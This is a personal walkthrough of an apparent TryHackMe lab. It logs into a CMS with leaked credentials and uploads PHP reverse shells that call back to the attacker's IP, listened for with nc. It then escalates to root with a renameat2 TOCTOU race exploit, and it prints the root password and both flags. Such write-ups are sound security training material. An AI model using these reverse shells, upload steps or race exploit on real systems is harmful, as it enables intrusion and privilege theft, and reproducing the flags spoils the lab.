----
It's a setup... Can you get the flags in time?
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/aab108830eaf8908ce3dd0f3d4336b2d.png)

### Task 2  Exploit the Machine

 Start Machine

_I have a theory that the truth is never told during the nine-to-five hours. - Hunter S. Thompson  
_

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.9.45 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.9.45:22
Open 10.10.9.45:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 19:20 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:20
Completed Parallel DNS resolution of 1 host. at 19:20, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:20
Scanning 10.10.9.45 [2 ports]
Discovered open port 22/tcp on 10.10.9.45
Discovered open port 80/tcp on 10.10.9.45
Completed Connect Scan at 19:20, 0.23s elapsed (2 total ports)
Initiating Service scan at 19:20
Scanning 2 services on 10.10.9.45
Completed Service scan at 19:20, 6.78s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.9.45.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 8.48s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.96s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Nmap scan report for 10.10.9.45
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-29 19:20:22 EDT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 844eb1493122948483979172cb233336 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuaqFOGQLuuh5gZPHAMXN7mbBvvKFQNjf7BE4nQcou0kK9vn/2NoMDyr3ZNKRvfG/Q2S+Nk1cew2KYvBN8OmJP0a4iTiQNd2MNftiOvH6zA7DbHD8WcuqoFNVUILB0fR3zHLOTJdZmvUX14TJnlGpd+Zt6wNOH9+EXNZDhjG7f7D/StcxurCuGAwkqQb7/oP5euE5sQaJ31ZnTL4RK4sk7LzXQprPBJa0IjEthBtKhSbKS0XmvzCFcSYNn/RUhFAOBR4WXKRGk9+WKlhj5KUli0BmUB6v9OnTcRZHjVQ7cj/8QoFYh5Ns38DM2oFYibhTGmODK6OeyOQgFe9iNc/KT
|   256 cc32193ff5b9a4d5ac320f6ef0833571 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAXDnQKHAfzUPrhhICFpTSbE3+bjHgyIEapWhaEZkimi2WdGqPh3+vX7602C3+B4Q+TitOB+YR7xQNmUxk89vac=
|   256 bdd800be49b515afbfd585f73aabd648 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ3eshAl/8myavr2XQdEDrVBN5hBGf1Jwxn8CajXqhZ1
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/cmsms/cmsms-2.1.6-install.php
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.70 seconds

cmsmsuser:devpass 

http://10.10.9.45/robots.txt

User-agent: *
Disallow: /cmsms/cmsms-2.1.6-install.php
 
Note to self:
Tommorow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday. 

http://10.10.9.45/cmsms/cmsms-2.1.6-install.php/index.php

after install it

http://10.10.9.45/cmsms/admin/login.php
login with creds

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php        
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?> 

then upload it (go to file manager)

revshell

http://10.10.9.45/cmsms/uploads/payload_ivan.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                         
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.9.45] 39840
SOCKET: Shell has connected! PID: 14150
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@toc:/var/www/html/cmsms/uploads$ ls
ls
NCleanBlue  images  index.html	ngrey  payload_ivan.php  simplex
www-data@toc:/var/www/html/cmsms/uploads$ cd /home
cd /home
www-data@toc:/home$ ls
ls
frank
www-data@toc:/home$ cd frank
cd frank
www-data@toc:/home/frank$ ls
ls
new_machine.txt  root_access  user.txt
www-data@toc:/home/frank$ ls -lah
ls -lah
total 52K
drwxr-xr-x 5 frank frank 4.0K Aug 18  2020 .
drwxr-xr-x 3 root  root  4.0K Aug 18  2020 ..
-rw------- 1 frank frank    1 Aug 18  2020 .bash_history
-rw-r--r-- 1 frank frank  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 frank frank 3.7K Apr  4  2018 .bashrc
drwx------ 2 frank frank 4.0K Aug 18  2020 .cache
drwx------ 3 frank frank 4.0K Aug 18  2020 .gnupg
-rw------- 1 root  root   203 Aug 18  2020 .mysql_history
-rw-r--r-- 1 frank frank  807 Apr  4  2018 .profile
-rw-r--r-- 1 frank frank    0 Aug 18  2020 .sudo_as_admin_successful
-rw------- 1 root  root  1.5K Aug 18  2020 .viminfo
-rw-r--r-- 1 frank frank  331 Aug 17  2020 new_machine.txt
drwxr-xr-x 2 frank frank 4.0K Jan 31  2021 root_access
-rw-r--r-- 1 frank frank   34 Aug 18  2020 user.txt
www-data@toc:/home/frank$ cat new_machine.txt
cat new_machine.txt
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait. 
www-data@toc:/home/frank$ su frank
su frank
Password: password

frank@toc:~$ cat user.txt
cat user.txt
thm{63616d70657276616e206c696665}

https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c

Time-of-Check to Time-of-Use (TOCTTOU) is a type of race condition vulnerability that occurs when a program's behavior depends on the state of a resource (e.g., file, directory) at two different times: the time of checking a condition and the time of using the resource. During this time interval, the state of the resource may change, leading to unexpected or malicious behavior.

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}

1. The `while(1)` loop continuously invokes the `SYS_renameat2` system call, checking and using the files/directories for renaming.
    
2. At the time of the `SYS_renameat2` system call, the code checks the state of the specified source and destination files/directories.
    
3. However, between the time of checking (in `syscall`) and using the files (in the `SYS_renameat2` system call), the state of the files/directories might change due to other processes or external factors.
    
4. This race condition may lead to unexpected behavior, as the source and destination files/directories might no longer be in the expected state when the `SYS_renameat2` system call is executed.
    
5. The program does not handle any synchronization or locking mechanisms to prevent this race condition.
    

In real-world scenarios, TOCTTOU vulnerabilities can lead to security issues where an attacker can manipulate the state of the resource during the time gap between checking and using it, potentially leading to data corruption, privilege escalation, or other security breaches.

┌──(root㉿kali)-[/home/witty/Downloads]
└─# git clone https://github.com/sroettger/35c3ctf_chals.git     
Cloning into '35c3ctf_chals'...
remote: Enumerating objects: 4541, done.
remote: Total 4541 (delta 0), reused 0 (delta 0), pack-reused 4541
Receiving objects: 100% (4541/4541), 45.25 MiB | 2.78 MiB/s, done.
Resolving deltas: 100% (957/957), done.
Updating files: 100% (4261/4261), done.
                                                                                       
┌──(root㉿kali)-[/home/witty/Downloads]
└─# cd 35c3ctf_chals/logrotate/exploit 
                                                                                       
┌──(root㉿kali)-[/home/…/Downloads/35c3ctf_chals/logrotate/exploit]
└─# ls
doit.sh  rename  rename.c
                                                                                       
┌──(root㉿kali)-[/home/…/Downloads/35c3ctf_chals/logrotate/exploit]
└─# cat rename.c 
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}

frank@toc:~$ wget 10.8.19.103/rename.c
wget 10.8.19.103/rename.c
--2023-07-30 00:02:22--  http://10.8.19.103/rename.c
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 295 [text/x-csrc]
Saving to: ‘rename.c’

rename.c              0%[                    ]       0  --.-KB/s              rename.c            100%[===================>]     295  --.-KB/s    in 0s      

2023-07-30 00:02:23 (29.1 MB/s) - ‘rename.c’ saved [295/295]

┌──(root㉿kali)-[/home/…/Downloads/35c3ctf_chals/logrotate/exploit]
└─# python3 -m http.server 80                                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.9.45 - - [29/Jul/2023 20:02:22] "GET /rename.c HTTP/1.1" 200 -

frank@toc:~$ mv rename.c root_access
mv rename.c root_access
frank@toc:~$ cd root_access
cd root_access
frank@toc:~/root_access$ ls
ls
readcreds  readcreds.c  rename.c  root_password_backup

frank@toc:~/root_access$ cat readcreds.c
cat readcreds.c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
	exit(1);
    }

    if (!access(argv[1],R_OK)) {
	    sleep(1);
	    file_data = open(argv[1], O_RDONLY);
    } else {
	    fprintf(stderr, "Cannot open %s \n", argv[1]);
	    exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);

}

Providing the `root_password_backup` file to the `readcreds` binary will show an error, as the file is owned by `root`

frank@toc:~/root_access$ ./readcreds 
./readcreds 
Binary to output the contents of credentials file 
 ./readcreds [file] 
frank@toc:~/root_access$ ./readcreds root_password_backup
./readcreds root_password_backup
Cannot open root_password_backup 

frank@toc:~/root_access$ touch race
touch race
frank@toc:~/root_access$ gcc rename.c -o rename
gcc rename.c -o rename
frank@toc:~/root_access$ ./rename race root_password_backup
./rename race root_password_backup

now in another session

┌──(witty㉿kali)-[~/Downloads]
└─$ head payload_monkey.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.19.103';
$port = 4444;
$chunk_size = 1400;
$write_a = null;

same upload it go to Content/File Manager

http://10.10.9.45/cmsms/uploads/payload_monkey.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.9.45] 45068
Linux toc 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:15:50 up  1:08,  0 users,  load average: 5.30, 4.22, 3.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@toc:/$ cd /home/frank/root_access
cd /home/frank/root_access
www-data@toc:/home/frank/root_access$ ls
ls
race  readcreds  readcreds.c  rename  rename.c	root_password_backup
www-data@toc:/home/frank/root_access$ ./readcreds root_password_backup
./readcreds root_password_backup
Root Credentials:  root:aloevera 

root@toc:/home/frank/root_access# cd /root
cd /root
root@toc:~# ls
ls
root.txt
root@toc:~# cat root.txt
cat root.txt
thm{7265616c6c696665}


```
![[Pasted image 20230729183025.png]]


Find and retrieve the user.txt flag  

*thm{63616d70657276616e206c696665}*

Escalate your privileges and acquire root.txt

https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c

*thm{7265616c6c696665}*

### Task 3  Further Exploration

**LiveOverflow** has an amazing video exploring this kind of vulnerability, as well as how to remediate it which you can find here. I thoroughly recommend checking it out if you're having trouble visualising how this kind of race condition works and how to properly exploit it:

[https://www.youtube.com/watch?v=5g137gsB9Wk](https://www.youtube.com/watch?v=5g137gsB9Wk)[](https://www.youtube.com/watch?v=5g137gsB9Wk)

The **Wikipedia** entry for this kind of vulnerability is also extremely useful, and provides similar examples in C of how this vulnerability can occur and be exploited for leveraging privileges.

Have a great day, stay safe.  

~  Polo  

Answer the questions below

I now understand where to find more information on this kind of vulnerability.  

 Completed
 


[[TwoMillion]]